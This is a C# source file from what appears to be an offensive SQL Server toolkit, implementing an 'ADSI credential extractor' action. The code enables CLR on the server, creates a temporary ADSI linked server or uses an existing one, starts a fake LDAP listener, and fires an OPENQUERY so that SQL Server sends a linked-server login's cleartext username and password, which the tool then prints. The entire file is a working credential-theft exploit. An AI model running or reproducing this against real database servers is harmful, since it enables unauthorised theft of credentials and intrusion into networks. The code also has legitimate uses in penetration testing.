﻿using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Collections.Generic;
using System.Data;
using System.Threading.Tasks;

namespace MSSQLand.Actions.Network
{
    /// <summary>
    /// Extracts credentials from ADSI linked servers.
    /// https://www.tarlogic.com/blog/linked-servers-adsi-passwords
    /// </summary>
    internal class AdsiCredentialExtractor : BaseAction
    {
        private enum Mode { Self, Link }
        
        [ArgumentMetadata(Position = 0, Description = "Mode: self (create temporary ADSI server) or link <server> (use existing ADSI server)")]
        private Mode _mode = Mode.Self;
        
        [ArgumentMetadata(Position = 1, Description = "Target ADSI server name (required for link mode)")]
        private string? _targetServer;


        public override void ValidateArguments(string additionalArguments)
        {
            if (string.IsNullOrWhiteSpace(additionalArguments))
            {
                // Default to self mode
                _mode = Mode.Self;
                return;
            }

            string[] parts = SplitArguments(additionalArguments);
            string command = parts[0].ToLower();

            switch (command)
            {
                case "self":
                    _mode = Mode.Self;
                    break;

                case "link":
                    if (parts.Length < 2)
                    {
                        throw new ArgumentException("Missing target ADSI server name. Example: /a:adsicreds link SQL-ADSI");
                    }
                    _mode = Mode.Link;
                    _targetServer = parts[1];
                    break;

                default:
                    throw new ArgumentException("Invalid mode. Use 'self' or 'link <ServerName>'");
            }
        }


        /// <summary>
        /// Executes the chosen ADSI extraction method.
        /// </summary>
        public override object? Execute(DatabaseContext databaseContext)
        {
            if (_mode == Mode.Self)
            {
                return ExtractCredentialsSelf(databaseContext);
            }

            if (_mode == Mode.Link)
            {
                return ExtractCredentials(databaseContext, _targetServer);
            }

            Logger.Error("Unknown execution mode.");
            return null;
        }

        /// <summary>
        /// Creates a temporary ADSI server and extracts credentials, then cleans up.
        /// </summary>
        private Tuple<string, string> ExtractCredentialsSelf(DatabaseContext databaseContext)
        {
            _targetServer = $"ADSI-{Guid.NewGuid().ToString("N").Substring(0, 6)}";
            
            Logger.Task($"Creating temporary ADSI server '{_targetServer}' for credential extraction");
            
            AdsiService adsiService = new(databaseContext);

            // Try to create the ADSI server
            if (!adsiService.CreateAdsiLinkedServer(_targetServer))
            {
                // If creation failed, try to clean up and retry once
                Logger.Warning("Initial creation failed. Attempting cleanup and retry...");
                try
                {
                    adsiService.DropLinkedServer(_targetServer);
                }
                catch
                {
                    // Ignore cleanup errors
                }

                if (!adsiService.CreateAdsiLinkedServer(_targetServer))
                {
                    Logger.Error("Failed to create temporary ADSI server.");
                    return null;
                }
            }

            try
            {
                // Extract credentials
                Tuple<string, string> credentials = ExtractCredentials(databaseContext, _targetServer);
                return credentials;
            }
            finally
            {
                // Always clean up the temporary server
                Logger.InfoNested($"Cleaning up temporary ADSI server '{_targetServer}'");
                try
                {
                    adsiService.DropLinkedServer(_targetServer);
                }
                catch (Exception ex)
                {
                    Logger.Warning($"Failed to cleanup temporary server: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Extracts credentials using an ADSI provider.
        /// </summary>
        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
        /// <param name="adsiServer">The ADSI server to target</param>
        /// <returns>A tuple containing the username and password.</returns>
        private Tuple<string, string> ExtractCredentials(DatabaseContext databaseContext, string adsiServer)
        {
            AdsiService adsiService = new(databaseContext);
            
            // Verify the ADSI server exists
            if (!adsiService.AdsiServerExists(adsiServer))
            {
                Logger.Error($"ADSI linked server '{adsiServer}' not found.");
                Logger.InfoNested("Use '/a:adsi list' to see available ADSI servers.");
                return null;
            }

            Logger.Task($"Extracting credentials using Active Directory Service Interfaces (ADSI) provider");

            if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
            {
                Logger.Error("Failed to enable CLR. Aborting execution.");
                return null;
            }

            adsiService.Port = Misc.GetRandomUnusedPort();

            Logger.TaskNested($"Targeting linked ADSI server: {adsiServer}");

            try
            {
                adsiService.LoadLdapServerAssembly();

                Task<DataTable> task = adsiService.ListenForRequest();

                Logger.TaskNested("Executing LDAP solicitation");

                string impersonateTarget = databaseContext.Server.ImpersonationUser;

                string exploitQuery = $"SELECT * FROM OPENQUERY([{adsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ');";

                if (!string.IsNullOrEmpty(impersonateTarget))
                {
                    Logger.Warning("You cannot retrieve impersonated user credential since it is not mapped to your fake ADSI server");
                    exploitQuery = $"REVERT; {exploitQuery}";
                }

                try
                {
                    databaseContext.QueryService.ExecuteNonProcessing(exploitQuery);
                }
                catch
                {
                    // Ignore the exception, it is normal to fail
                }

                // Wait for the background task to complete and get the result
                DataTable ldapResult = task.Result;

                if (ldapResult != null && ldapResult.Rows.Count > 0)
                {
                    string rawCredentials = ldapResult.Rows[0][0].ToString();
                    Logger.Success("Credentials retrieved");

                    // Split **only at the first occurrence** of `:`
                    int splitIndex = rawCredentials.IndexOf(':');
                    if (splitIndex > 0)
                    {
                        string username = rawCredentials.Substring(0, splitIndex);
                        string password = rawCredentials.Substring(splitIndex + 1);

                        Logger.NewLine();
                        Console.WriteLine($"Username: {username}");
                        Console.WriteLine($"Password: {password}");

                        return Tuple.Create(username.Trim(), password.Trim());
                    }
                }

                Logger.Warning("No credentials found");
                return null;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error occurred during the ADSI credentials retrieval exploit: {ex.Message}");
                return null;
            }
        }
    }
}
